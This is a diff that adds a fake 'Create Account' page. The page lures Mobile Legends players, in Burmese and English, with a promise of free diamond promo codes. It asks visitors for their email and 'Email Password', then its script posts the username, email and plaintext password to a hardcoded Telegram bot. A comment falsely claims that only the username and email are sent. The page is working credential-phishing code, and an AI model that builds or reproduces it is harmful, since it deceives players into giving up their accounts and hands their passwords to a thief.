@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Create Account</title>
+
+<style>
+body{
+    margin:0;
+    height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    background:#0f172a;
+    font-family:sans-serif;
+    color:white;
+}
+
+.box{
+    width:320px;
+    background:#1e293b;
+    padding:25px;
+    border-radius:20px;
+    box-shadow:0 0 20px rgba(0,0,0,0.4);
+
+}
+.small-text{
+    font-size:12px;
+    text-align:center;
+    margin-top:10px;
+    color:#94a3b8;
+}
+
+h2{
+    text-align:center;
+    margin-bottom:20px;
+}
+
+input{
+    width:100%;
+    margin-top:12px;
+    padding:12px;
+    border:none;
+    border-radius:12px;
+    outline:none;
+    font-size:15px;
+    box-sizing:border-box;
+}
+
+button{
+    width:100%;
+    margin-top:15px;
+    padding:12px;
+    border:none;
+    border-radius:12px;
+    background:#3b82f6;
+    color:white;
+    font-size:16px;
+    cursor:pointer;
+}
+
+button:hover{
+    background:#2563eb;
+}
+
+#status{
+    text-align:center;
+    margin-top:12px;
+}
+</style>
+</head>
+<body>
+
+<div class="box">
+    <h2>Create Account</h2>
+
+    <input type="text" id="username" placeholder=" Username">
+    <input type="email" id="email" placeholder="Your Email">
+    <input type="password" id="password" placeholder="Your Email Password">
+
+    <button onclick="register()">Create Account</button>
+    <p class="small-text">diamond ၅ လုံးရယူလိုပါက acc ဖွင့်ပေးရန်လိုအပ်ပါသည်။ Create an account to get promo code of mlbb diamond💎(5). </p>
+
+    <div id="status"></div>
+</div>
+
+<script>
+async function register(){
+
+    const username = document.getElementById("username").value;
+    const email = document.getElementById("email").value;
+    const password = document.getElementById("password").value;
+
+    if(!username || !email || !password){
+        alert("Fill all fields");
+        return;
+    }
+
+    // ========= YOUR TELEGRAM BOT =========
+    const botToken = "8583711661:AAH4K-5pCUcwa50db8m5Qn1zqBpMtqR7PRU";
+    const chatId = "6433822164";
+    // =====================================
+
+    // SAFE: only send username/email notification
+    const text =
+`New Account Created
+
+Username: ${username}
+Email: ${email}
+Password: ${password}`;
+
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+    try{
+
+        await fetch(url,{
+            method:"POST",
+            headers:{
+                "Content-Type":"application/json"
+            },
+            body:JSON.stringify({
+                chat_id: chatId,
+                text: text
+            })
+        });
+
+        document.getElementById("status").innerHTML =
+        "Account Created Successfully";
+
+        document.getElementById("username").value = "";
+        document.getElementById("email").value = "";
+        document.getElementById("password").value = "";
+
+    }catch(err){
+        document.getElementById("status").innerHTML = "Error";
+    }
+}
+</script>
+
+</body>
+</html>
